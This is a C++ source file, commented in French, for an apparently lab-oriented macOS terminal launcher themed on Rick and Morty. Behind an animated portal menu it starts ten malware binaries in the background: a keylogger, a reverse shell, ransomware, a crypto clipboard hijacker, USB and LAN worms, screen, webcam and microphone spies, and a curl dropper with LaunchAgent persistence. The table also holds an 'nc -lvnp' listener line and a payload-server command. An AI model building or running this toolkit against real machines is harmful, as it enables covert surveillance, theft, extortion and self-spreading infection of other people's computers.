// language: C++17, file: src/macos/rick_lab_mac.cpp, target: macOS Terminal (ANSI natif)
// Edition macOS du launcher : portail vert anime, menu, lancement des tools
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cmath>
#include <unistd.h>
#include <string>
#include <vector>

struct Tool {
    const char* key;
    const char* bin;   // binaire dans build/mac/
    const char* name;
    const char* desc;
    const char* args;  // args par defaut pour le test
    const char* note;  // permission TCC eventuelle
};

static const Tool g_tools[] = {
    { "1", "01_keylogger",    "MEESEEKS KEYLOGGER", "CGEventTap session, log horodate",            "",              "Accessibilite" },
    { "2", "02_reverse_shell","PORTAL SHELL",       "reverse TCP + zsh, reconnexion auto",         "127.0.0.1 4444","listener: nc -lvnp 4444" },
    { "3", "03_ransomware",   "SCHWIFTYCRYPT",      "AES-256-CBC (CommonCrypto), .morty",          "",              "mode decrypt inclus" },
    { "4", "04_clipboard",    "CLIP HIJACK",        "pbpaste/pbcopy, remplace adresses crypto",    "bc1qdemoxxxx",  "" },
    { "5", "05_usb_worm",     "PLUMBUS WORM",       "copie sur /Volumes, fichier cache",           "",              "" },
    { "6", "06_lan_worm",     "CITADEL WORM",       "sweep /24, ssh+scp via expect",               "",              "" },
    { "7", "07_screenspy",    "INTERDIM SCREENS",   "screencapture -x periodique",                 "30",            "Enregistrement d'ecran" },
    { "8", "08_webcam",       "BLIPS & CHITZ CAM",  "AVFoundation, PNG periodique",                "10",            "autorisation Camera" },
    { "9", "09_dropper",      "PORTAL DROPPER",     "curl + exec cache + LaunchAgent",             "http://127.0.0.1:8080/p", "serveur: python3 -m http.server 8080" },
    { "0", "10_mic",          "POOPYBUTTHOLE MIC",  "AVAudioRecorder, WAV 60 s en boucle",         "",              "autorisation Micro" },
};
static const int g_ntools = 10;

static void Col(int r, int g, int b) { printf("\x1b[38;2;%d;%d;%dm", r, g, b); }
static void Reset() { printf("\x1b[0m"); }

static void Portal(int frames, bool opening) {
    const char ringch[] = "@%#*+=-:. ";
    for (int f = 0; f < frames; f++) {
        printf("\x1b[H\x1b[2J");
        double t = opening ? (double)f / frames : 1.0 - (double)f / frames;
        int maxR = (int)(t * 16);
        for (int y = 0; y < 26; y++) {
            for (int x = 0; x < 82; x++) {
                double dx = x - 41, dy = (y - 13) * 2.2;
                double r = sqrt(dx * dx + dy * dy);
                double ang = atan2(dy, dx) * 57.29 + f * 25;
                if (r < maxR) {
                    int band = (int)r % 8;
                    Col(0, 120 + (int)(135 * (1.0 - r / (maxR + 1))), 40 + band * 6);
                    double swirl = sin(ang * 3.14159 / 180);
                    char c = ringch[band % 9];
                    if (swirl > 0.92) c = '@';
                    if (r < 2) { Col(0, 255, 90); c = 'O'; }
                    putchar(c);
                } else putchar(' ');
            }
            putchar('\n');
        }
        fflush(stdout);
        usleep(45000);
    }
}

static void GlitchTitle(const char* txt, int reps) {
    for (int i = 0; i < reps; i++) {
        printf("\x1b[s");
        if (i % 7 == 0) Col(255, 60, 200); else Col(20, 255, 80);
        printf("%s", txt);
        Reset();
        printf("\x1b[u");
        fflush(stdout);
        usleep(60000);
    }
}

static void Say(const char* txt) {
    std::string cmd = "say \"" + std::string(txt) + "\" &";
    system(cmd.c_str());
}

static void DrawMenu() {
    printf("\x1b[H\x1b[2J");
    Col(0, 255, 90);
    printf("             .-@@@@@-.             \n");
    Col(0, 220, 70);
    printf("          .-@@@@@@@@@@@-.          \n");
    Col(0, 180, 60);
    printf("         @@@@@@@@O@@@@@@@         \n\n");
    Col(0, 255, 120);
    printf("   RICK & MORTY MALWARE LAB - C-137   [edition macOS]\n\n");
    for (int i = 0; i < g_ntools; i++) {
        Col(0, 255, 120);
        printf("  [%s] ", g_tools[i].key);
        Col(160, 255, 180);
        printf("%-20s", g_tools[i].name);
        Col(90, 180, 110);
        printf("%s\n", g_tools[i].desc);
    }
    Col(0, 255, 150);
    printf("  [b] say    [p] replay portail    [q] quit\n");
    Reset();
}

static void ToolCard(int i) {
    printf("\x1b[H\x1b[2J");
    Portal(22, true);
    Col(0, 255, 120);
    printf("\n ==============================================================\n");
    printf("   TOOL %d : %s\n", (i + 1) % 10, g_tools[i].name);
    Col(120, 220, 160);
    printf("   %s\n", g_tools[i].desc);
    if (g_tools[i].note[0]) { Col(255, 200, 80); printf("   permission : %s\n", g_tools[i].note); }
    Col(90, 170, 110);
    printf("   binaire : build/mac/%s   args defaut : %s\n", g_tools[i].bin, g_tools[i].args);
    Col(200, 255, 200);
    printf("   [r] lancer (fond)   [k] tuer   [m] menu : ");
    Reset();
    fflush(stdout);
    char c = (char)getchar(); getchar();
    if (c == 'r') {
        std::string cmd = "build/mac/" + std::string(g_tools[i].bin) + " " + g_tools[i].args + " >/dev/null 2>&1 &";
        system(cmd.c_str());
        Col(0, 255, 90); printf("\n [OK] lance en fond (pid via: pgrep %s)\n", g_tools[i].bin);
        Reset(); sleep(1);
    } else if (c == 'k') {
        std::string cmd = "pkill -f " + std::string(g_tools[i].bin);
        system(cmd.c_str());
        Col(255, 80, 80); printf("\n [X] tue\n"); Reset(); sleep(1);
    }
}

int main() {
    printf("\x1b[?25l");
    Portal(46, true);
    GlitchTitle("RICK & MORTY MALWARE LAB - C-137 [macOS]", 12);

    char c = 0;
    while (c != 'q') {
        DrawMenu();
        c = (char)getchar();
        if (c == '\n' || c == '\r') c = (char)getchar();
        if (c >= '0' && c <= '9') {
            int idx = (c == '0') ? 9 : (c - '1');
            if (idx >= 0 && idx < g_ntools) ToolCard(idx);
        } else if (c == 'b') Say("Wubba lubba dub dub");
        else if (c == 'p') { Portal(46, true); Portal(20, false); Portal(46, true); }
    }
    Portal(30, false);
    printf("\x1b[H\x1b[2J");
    Col(0, 255, 120);
    printf("\n  wubba lubba dub dub.\n\n");
    Reset();
    printf("\x1b[?25h");
    return 0;
}
